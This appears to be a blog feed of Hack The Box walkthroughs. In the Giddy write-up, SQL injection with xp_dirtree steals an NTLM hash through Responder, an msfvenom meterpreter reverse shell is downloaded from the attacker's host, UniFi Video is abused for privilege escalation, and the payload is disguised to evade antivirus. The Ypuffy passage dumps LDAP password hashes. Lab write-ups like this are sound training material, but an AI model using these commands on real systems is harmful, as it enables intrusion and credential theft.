&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with nmap to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC giddy.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/giddy/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;nmap-tells-us-that-port-80-and-443-are-open-and-running-http--port-3389-is-also-open-and-it-says-microsoft-terminal-services-lets-check-http&quot;&gt;nmap tells us that port 80 and 443 are open and running http , port 3389 is also open and it says “Microsoft Terminal Services”, Let’s check http&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-enumeration&quot;&gt;HTTP Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;on-http-port-80-theres-only-this-picture-&quot;&gt;On http (port 80) there’s only this picture :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/giddy/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;also-the-same-picture-on-https-port-443&quot;&gt;Also the same picture on https (port 443)&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/giddy/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-run-gobuster-with-directory-list-23-mediumtxt-and-see-what-we-will-get&quot;&gt;Let’s run gobuster with &lt;code class=&quot;highlighter-rouge&quot;&gt;directory-list-2.3-medium.txt&lt;/code&gt; and see what we will get&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster -u http://giddy.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -to 250s&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;results-&quot;&gt;Results :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)                                                                                       
=====================================================                                                                                       
[+] Mode         : dir                                                                                                                      
[+] Url/Domain   : http://giddy.htb/                                                                                                        
[+] Threads      : 100                                                                                                                      
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                             
[+] Status codes : 200,204,301,302,307,403                                                                                                  
[+] Timeout      : 4m10s                                                                                                                    
=====================================================                                                                                       
2019/02/15 21:36:09 Starting gobuster                                                                                                       
=====================================================
/remote (Status: 302)
/mvc (Status: 301)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-got-2-sub-directories-remote-and-mvc&quot;&gt;We got 2 sub directories &lt;code class=&quot;highlighter-rouge&quot;&gt;/remote&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/mvc&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;lets-take-a-look-at-remote-&quot;&gt;Let’s take a look at &lt;code class=&quot;highlighter-rouge&quot;&gt;/remote&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/giddy/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-redirects-us-to-this-page-titled-as-windows-powershell-web-access--we-dont-have-any-credentials-so-we-can-ignore-this-for-now-and-check-mvc&quot;&gt;It redirects us to this page titled as &lt;code class=&quot;highlighter-rouge&quot;&gt;Windows PowerShell Web Access&lt;/code&gt; , we don’t have any credentials so we can ignore this for now and check &lt;code class=&quot;highlighter-rouge&quot;&gt;/mvc&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/giddy/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-get-this-aspnet-application&quot;&gt;And we get this &lt;code class=&quot;highlighter-rouge&quot;&gt;ASP.NET&lt;/code&gt; application&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;sqli-and-getting-user&quot;&gt;SQLI and getting User&lt;/h3&gt;
&lt;h4 id=&quot;after-some-regular-enumeration-we-will-find-that-when-we-click-on-a-product-name-we-get-something-like-this-&quot;&gt;After some regular enumeration we will find that when we click on a product name we get something like this :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/giddy/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-url-has-a-parameter-called-productsubcategoryid--and-if-we-try-a-single-quote--&quot;&gt;The url has a parameter called &lt;code class=&quot;highlighter-rouge&quot;&gt;ProductSubCategoryId&lt;/code&gt; , and if we try a single quote &lt;code class=&quot;highlighter-rouge&quot;&gt;'&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/giddy/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-get-an-error-saying-unclosed-quotation-mark-after-the-character-string-so-this-parameter-is-sql-injectable--lets-try-something-like-1-update-product-set-name-&quot;&gt;We get an error saying “Unclosed quotation mark after the character string” so this parameter is sql injectable , let’s try something like &lt;code class=&quot;highlighter-rouge&quot;&gt;1; UPDATE Product SET Name= ''&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/giddy/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-see-that-it-dumped-the-products-we-can-run-responder-and-use-xpdirtree-to-make-it-try-to-connect-to-us--you-can-read-about-xpdirtree-here&quot;&gt;And we see that it dumped the products, we can run responder and use &lt;code class=&quot;highlighter-rouge&quot;&gt;xpdirtree&lt;/code&gt; to make it try to connect to us , you can read about &lt;code class=&quot;highlighter-rouge&quot;&gt;xpdirtree&lt;/code&gt; &lt;a href=&quot;http://www.patrickkeisler.com/2012/11/how-to-use-xpdirtree-to-list-all-files.html&quot;&gt;here&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;to-do-this-lets-run-responder-first-responder--i-tun0&quot;&gt;To do this let’s run responder first &lt;code class=&quot;highlighter-rouge&quot;&gt;responder -I tun0&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;then-lets-use-xpdirtree--1-exec-mastersysxp_dirtree-1010xxxxfakeshare&quot;&gt;Then let’s use &lt;code class=&quot;highlighter-rouge&quot;&gt;xpdirtree&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;1; EXEC MASTER.sys.xp_dirtree '\\10.10.xx.xx\fakeshare'&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/giddy/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;what-is-this-doing-is-simply-running-a-fake-smb-server-with-responder-that-steals-ntlm-hashes--then-by-using-xpdirtree-we-make-the-server-try-to-connect-to-our-fake-smb-server-lets-check-responder-now-&quot;&gt;What is this doing is simply running a fake smb server with responder that steals ntlm hashes , then by using &lt;code class=&quot;highlighter-rouge&quot;&gt;xpdirtree&lt;/code&gt; we make the server try to connect to our fake smb server. Let’s check responder now :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/giddy/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-captured-ntlm-hash-for-a-user-called-stacy--lets-crack-the-hash-with-john&quot;&gt;We captured ntlm hash for a user called &lt;code class=&quot;highlighter-rouge&quot;&gt;Stacy&lt;/code&gt; , Let’s crack the hash with john&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/giddy/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-the-password-is-xnnwo6272k7x--lets-use-the-powershell-web-access&quot;&gt;And the password is &lt;code class=&quot;highlighter-rouge&quot;&gt;xNnWo6272k7x&lt;/code&gt; , let’s use the PowerShell Web Access&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/giddy/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-ge-this-web-interface-for-powershell-&quot;&gt;We ge this web interface for powershell :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/giddy/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-get-the-user-flag-now-&quot;&gt;We can get the user flag now :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/giddy/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-user-&quot;&gt;And we owned user !&lt;/h4&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;unifivideo-local-privilege-escalation&quot;&gt;unifivideo local privilege escalation&lt;/h3&gt;
&lt;h4 id=&quot;if-we-return-to-documents-again-we-will-find-a-file-called-unifivideo&quot;&gt;If we return to &lt;code class=&quot;highlighter-rouge&quot;&gt;Documents&lt;/code&gt; again we will find a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;unifivideo&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/giddy/15.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;UniFi Video is a powerful and flexible, integrated IP video management
surveillance system designed to work with Ubiquiti’s UniFi Video Camera product
line. UniFi Video has an intuitive, configurable, and feature‑packed user
interface with advanced features such as motion detection, auto‑discovery,
user-level security, storage management, reporting, and mobile device support.
&lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;a-quick-google-search-and-we-will-find-that-an-old-version-of-unifivideo-had-a-local-privilege-escalation-vulnerability--check-it-here&quot;&gt;A quick google search and we will find that an old version of unifivideo had a local privilege escalation vulnerability , check it &lt;a href=&quot;https://www.exploit-db.com/exploits/43390&quot;&gt;here&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;whats-happening-is--upon-the-start-of-the-service-ubiquiti-unifi-video-it-tries-to-execute-a-file-called-taskkillexe-in-cprogramdataunifi-video-but-that-file-doesnt-exist-by-default--if-we-have-write-permissions-to-that-directory-we-can-place-our-payload-there-as-taskkillexe-then-restart-the-service-and-because-the-service-runs-with-privileged-permissions--it-will-be-excuted-as-administrator&quot;&gt;What’s happening is , Upon the start of the service “Ubiquiti UniFi Video” it tries to execute a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;taskkill.exe&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\ProgramData\unifi-video\&lt;/code&gt; but that file doesn’t exist by default , if we have write permissions to that directory we can place our payload there as &lt;code class=&quot;highlighter-rouge&quot;&gt;taskkill.exe&lt;/code&gt; then restart the service. And because the service runs with privileged permissions , it will be excuted as administrator.&lt;/h4&gt;
&lt;h4 id=&quot;lets-first-create-a-payload-with-msfvenom-&quot;&gt;Let’s first create a payload with msfvenom :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.xx.xx LPORT=1337 -f exe &amp;gt; taskkill.exe&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/giddy/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-will-set-up-the-handler-on-metasploit-&quot;&gt;We will set up the handler on metasploit :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;use multi/handler&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;set payload windows/meterpreter_reverse_tcp&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;set LHOST 10.10.xx.xx&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;set LPORT 1337&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-run-a-simple-http-server-with-python-to-host-the-payload&quot;&gt;Then we will run a simple http server with python to host the payload&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python -m SimpleHTTPServer 80&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-that-we-will-download-the-file--since-we-are-on-powershell-we-can-do-this-&quot;&gt;After that we will download the file , since we are on powershell we can do this :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-WebRequest -o taskkill.exe http://10.10.xx.xx/taskkill.exe&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-stop-the-service-&quot;&gt;Then we will stop the service :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Stop-Service &quot;Ubiquiti UniFi Video&quot;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/giddy/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;start-it-again-&quot;&gt;Start it again :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Start-Service &quot;Ubiquiti UniFi Video&quot;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/giddy/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-check-our-listener&quot;&gt;Let’s check our listener&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/giddy/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-didnt-get-a-meterpreter-session-&quot;&gt;We didn’t get a meterpreter session !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;evading-anti-virus-and-getting-root&quot;&gt;Evading anti-virus and getting root&lt;/h3&gt;
&lt;h4 id=&quot;we-didnt-get-a-meterpreter-session-because-theres-some-kind-of-anti-virus-blocking-our-payload--so-what-im-going-to-do-is-to-use-a-framework-called-phantom-evasion--you-can-get-it-from-github&quot;&gt;We didn’t get a meterpreter session because there’s some kind of anti-virus blocking our payload , so what i’m going to do is to use a framework called &lt;code class=&quot;highlighter-rouge&quot;&gt;phantom evasion&lt;/code&gt; , you can get it from &lt;a href=&quot;https://github.com/oddcod3/Phantom-Evasion&quot;&gt;github&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/giddy/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-will-use-1-windows-modules--then-1-shellcode-injection--4-windows-shellcode-injection-heapalloc--after-that-it-will-ask-for-the-payload-&quot;&gt;We will use [1] windows modules , then [1] shellcode injection , [4] windows shellcode injection heapalloc , after that it will ask for the payload :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/giddy/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-will-choose-msfvenom&quot;&gt;We will choose Msfvenom&lt;/h4&gt;
&lt;h4 id=&quot;and-for-encoding-we-will-choose-4-x86xor_dynamic--triple-multibyte-key-xor&quot;&gt;And for encoding we will choose [4] x86/xor_dynamic + Triple Multibyte-key xor:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/giddy/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-will-ask-for-adding-multi-processes-behaviour--stripping-and-signing-the-executable--we-will-say-no-to-all-of-them--then-finally-we-will-have-our-payload&quot;&gt;It will ask for adding multi processes behaviour , stripping and signing the executable , we will say no to all of them , then finally we will have our payload.&lt;/h4&gt;
&lt;h4 id=&quot;we-will-repeat-what-we-did-with-the-other-payload-again--and-lets-check-our-listener-&quot;&gt;We will repeat what we did with the other payload again , and let’s check our listener :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/giddy/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-a-meterpreter-session-and-owned-root-&quot;&gt;We got a meterpreter session and owned root !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---ypuffy&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/ypuffy/&quot;&gt;Hack The Box - Ypuffy&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey guys today Giddy retired and this is my write-up. Giddy was a nice windows box , This box had a nice sqli vulnerability which we will use to steal ntlm hashes and login , Then the privilege escalation was a Local Privilege Escalation vulnerability in a software called Ubiquiti UniFi Video which also was a cool vulnerability , I had fun doing this box as it was a challenging one. It’s a windows box and its ip is 10.10.10.104 , I added it to /etc/hosts as giddy.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC giddy.htb nmap tells us that port 80 and 443 are open and running http , port 3389 is also open and it says “Microsoft Terminal Services”, Let’s check http HTTP Enumeration On http (port 80) there’s only this picture : Also the same picture on https (port 443) Let’s run gobuster with directory-list-2.3-medium.txt and see what we will get gobuster -u http://giddy.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -to 250s Results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://giddy.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 4m10s ===================================================== 2019/02/15 21:36:09 Starting gobuster ===================================================== /remote (Status: 302) /mvc (Status: 301) We got 2 sub directories /remote and /mvc Let’s take a look at /remote : It redirects us to this page titled as Windows PowerShell Web Access , we don’t have any credentials so we can ignore this for now and check /mvc And we get this ASP.NET application SQLI and getting User After some regular enumeration we will find that when we click on a product name we get something like this : The url has a parameter called ProductSubCategoryId , and if we try a single quote ' : We get an error saying “Unclosed quotation mark after the character string” so this parameter is sql injectable , let’s try something like 1; UPDATE Product SET Name= '' And we see that it dumped the products, we can run responder and use xpdirtree to make it try to connect to us , you can read about xpdirtree here To do this let’s run responder first responder -I tun0 Then let’s use xpdirtree : 1; EXEC MASTER.sys.xp_dirtree '\\10.10.xx.xx\fakeshare' What is this doing is simply running a fake smb server with responder that steals ntlm hashes , then by using xpdirtree we make the server try to connect to our fake smb server. Let’s check responder now : We captured ntlm hash for a user called Stacy , Let’s crack the hash with john And the password is xNnWo6272k7x , let’s use the PowerShell Web Access We ge this web interface for powershell : We can get the user flag now : And we owned user ! unifivideo local privilege escalation If we return to Documents again we will find a file called unifivideo UniFi Video is a powerful and flexible, integrated IP video management surveillance system designed to work with Ubiquiti’s UniFi Video Camera product line. UniFi Video has an intuitive, configurable, and feature‑packed user interface with advanced features such as motion detection, auto‑discovery, user-level security, storage management, reporting, and mobile device support. A quick google search and we will find that an old version of unifivideo had a local privilege escalation vulnerability , check it here What’s happening is , Upon the start of the service “Ubiquiti UniFi Video” it tries to execute a file called taskkill.exe in C:\ProgramData\unifi-video\ but that file doesn’t exist by default , if we have write permissions to that directory we can place our payload there as taskkill.exe then restart the service. And because the service runs with privileged permissions , it will be excuted as administrator. Let’s first create a payload with msfvenom : msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.xx.xx LPORT=1337 -f exe &amp;gt; taskkill.exe We will set up the handler on metasploit : use multi/handler set payload windows/meterpreter_reverse_tcp set LHOST 10.10.xx.xx set LPORT 1337 Then we will run a simple http server with python to host the payload python -m SimpleHTTPServer 80 After that we will download the file , since we are on powershell we can do this : Invoke-WebRequest -o taskkill.exe http://10.10.xx.xx/taskkill.exe Then we will stop the service : Stop-Service &quot;Ubiquiti UniFi Video&quot; Start it again : Start-Service &quot;Ubiquiti UniFi Video&quot; Let’s check our listener We didn’t get a meterpreter session ! Evading anti-virus and getting root We didn’t get a meterpreter session because there’s some kind of anti-virus blocking our payload , so what i’m going to do is to use a framework called phantom evasion , you can get it from github We will use [1] windows modules , then [1] shellcode injection , [4] windows shellcode injection heapalloc , after that it will ask for the payload : We will choose Msfvenom And for encoding we will choose [4] x86/xor_dynamic + Triple Multibyte-key xor: It will ask for adding multi processes behaviour , stripping and signing the executable , we will say no to all of them , then finally we will have our payload. We will repeat what we did with the other payload again , and let’s check our listener : We got a meterpreter session and owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Ypuffy</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/giddy/0.png" /></entry><entry><title type="html">Hack The Box - Ypuffy</title><link href="http://localhost:4000/hack-the-box/ypuffy/" rel="alternate" type="text/html" title="Hack The Box - Ypuffy" /><published>2019-02-09T00:00:00+02:00</published><updated>2019-02-09T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/ypuffy</id><content type="html" xml:base="http://localhost:4000/hack-the-box/ypuffy/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-ypuffy-retired-and-this-is-my-write-up-this-box-is-a-little-different-from-the-other-boxes-its-not-windows-or-linux--its-running-openbsd-which-is-a-unix-like-system-i-really-liked-the-privilege-escalation-in-this-box-because-it-had-some-cool-ssh-stuff-without-talking-too-much-lets-jump-right-in-its-a-medium-difficulty-box-and-its-ip-is-101010107--i-added-it-in-etchosts-as-ypuffyhtb&quot;&gt;Hey guys today Ypuffy retired and this is my write-up. This box is a little different from the other boxes. It’s not windows or linux , it’s running openbsd which is a unix-like system. I really liked the privilege escalation in this box because it had some cool ssh stuff. Without talking too much let’s jump right in. It’s a medium difficulty box and its ip is 10.10.10.107 , i added it in &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;ypuffy.htb&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ypuffy/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-so-&quot;&gt;As always we will start with nmap so :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC ypuffy.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ypuffy/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;nmap-tells-us-that-theres-ssh-running-on-port-22--http-on-port-80--smb-on-port-139-and-445--ldap-on-port-389&quot;&gt;Nmap tells us that there’s ssh running on port 22 , http on port 80 , smb on port 139 and 445 , ldap on port 389&lt;/h4&gt;
&lt;h4 id=&quot;it-also-tells-us-that-we-can-connect-anonymously-to-ldap&quot;&gt;It also tells us that we can connect anonymously to ldap.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;initial-enumeration&quot;&gt;Initial Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;lets-check-http-first&quot;&gt;Let’s check http first&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ypuffy/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;connection-reset-http-will-be-useful-later-but-not-now&quot;&gt;Connection reset. http will be useful later but not now.&lt;/h4&gt;
&lt;h4 id=&quot;moving-on-to-the-next-thing--we-have-smb-lets-see-if-we-can-do-a-null-authentication-and-enumerate-the-shares-we-will-use-smbmap&quot;&gt;Moving on to the next thing , we have smb. Let’s see if we can do a null authentication and enumerate the shares. We will use &lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap -H ypuffy.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ypuffy/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;access-denied&quot;&gt;Access Denied.&lt;/h4&gt;
&lt;h4 id=&quot;lets-check-ldap&quot;&gt;Let’s check ldap&lt;/h4&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;ldap&quot;&gt;LDAP&lt;/h3&gt;
&lt;h4 id=&quot;nmap-told-us-that-anonymous-authentication-was-allowed-so-we-will-use-a-tool-called-ldapsearch&quot;&gt;nmap told us that anonymous authentication was allowed so we will use a tool called &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapsearch&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ldapsearch -h 10.10.10.107 -p 389 -x -b dc=hackthebox,dc=htb&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;full-output-&quot;&gt;Full Output :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# extended LDIF
#
# LDAPv3
# base &amp;lt;dc=hackthebox,dc=htb&amp;gt; with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# hackthebox.htb
dn: dc=hackthebox,dc=htb
dc: hackthebox
objectClass: top
objectClass: domain

# passwd, hackthebox.htb
dn: ou=passwd,dc=hackthebox,dc=htb
ou: passwd
objectClass: top
objectClass: organizationalUnit

# bob8791, passwd, hackthebox.htb
dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb
uid: bob8791
cn: Bob
objectClass: account
objectClass: posixAccount
objectClass: top
userPassword:: e0JTREFVVEh9Ym9iODc5MQ==
uidNumber: 5001
gidNumber: 5001
gecos: Bob
homeDirectory: /home/bob8791
loginShell: /bin/ksh

# alice1978, passwd, hackthebox.htb
dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb
uid: alice1978
cn: Alice
objectClass: account
objectClass: posixAccount
objectClass: top
objectClass: sambaSamAccount
userPassword:: e0JTREFVVEh9YWxpY2UxOTc4
uidNumber: 5000
gidNumber: 5000
gecos: Alice
homeDirectory: /home/alice1978
loginShell: /bin/ksh
sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001
displayName: Alice
sambaAcctFlags: [U          ]
sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000
sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B
sambaPwdLastSet: 1532916644

# group, hackthebox.htb
dn: ou=group,dc=hackthebox,dc=htb
ou: group
objectClass: top
objectClass: organizationalUnit

# bob8791, group, hackthebox.htb
dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb
objectClass: posixGroup
objectClass: top
cn: bob8791
userPassword:: e2NyeXB0fSo=
gidNumber: 5001

# alice1978, group, hackthebox.htb
dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb
objectClass: posixGroup
objectClass: top
cn: alice1978
userPassword:: e2NyeXB0fSo=
gidNumber: 5000

# ypuffy, hackthebox.htb
dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb
sambaDomainName: YPUFFY
sambaSID: S-1-5-21-3933741069-3307154301-3557023464
sambaAlgorithmicRidBase: 1000
objectclass: sambaDomain
sambaNextUserRid: 1000
sambaMinPwdLength: 5
sambaPwdHistoryLength: 0
sambaLogonToChgPwd: 0
sambaMaxPwdAge: -1
sambaMinPwdAge: 0
sambaLockoutDuration: 30
sambaLockoutObservationWindow: 30
sambaLockoutThreshold: 0
sambaForceLogoff: -1
sambaRefuseMachinePwdChange: 0
sambaNextRid: 1001

# search result
search: 2
result: 0 Success

# numResponses: 9
# numEntries: 8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-can-also-use-nmap-to-enumerate-ldap--with-a-script-called-ldap-search&quot;&gt;we can also use nmap to enumerate ldap , with a script called &lt;code class=&quot;highlighter-rouge&quot;&gt;ldap-search&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p 389 --script ldap-search ypuffy.htb&lt;/code&gt;&lt;/p&gt;
